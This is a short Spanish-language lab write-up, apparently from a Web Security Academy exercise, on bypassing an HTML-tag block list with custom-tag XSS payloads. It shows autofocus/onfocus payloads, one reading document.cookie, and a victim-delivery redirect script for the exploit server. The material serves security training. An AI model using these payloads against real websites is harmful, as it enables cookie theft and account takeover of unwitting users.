## LAB

![[20260329171015.png]](20260329171015.png)

En el laboratorio, al insertar un payload de javascript vemos que este nos bloquea

![[20260329171234.png]](20260329171234.png)

por lo que todas las etiquetas html estan siendo bloqueadas, por ello podemos usar una custom. En esta etiqueta podemos agregar un autofocus para poder generar un alert.

```c
autofocus onfocus="alert(1)
```

![[20260329171552.png]](20260329171552.png)

Pero vemos que este no funciona, por lo que agregamos a este un `tabiindex` y `autofocus`

```c
<xss tabindex="1" onfocus="alert(1)" autofocus>
```

![[20260329173411.png]](20260329173411.png)

En el caso de no usar autofocus podemos usar un #:

```c
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

![[20260329173247.png]](20260329173247.png)

Ambas ejecutan un xss como se ve en la siguiente imagen:

![[20260329172411.png]](20260329172411.png)

Luego debemos de hacer la entrega a la victima, para ello podemos usar el exploit server:

```js
<script>
document.location="https://0a4600b4047be34a80a6124300350082.web-security-academy.net/?search=<xss tabindex="1" onfocus="alert(1)" autofocus>"
</script>
```
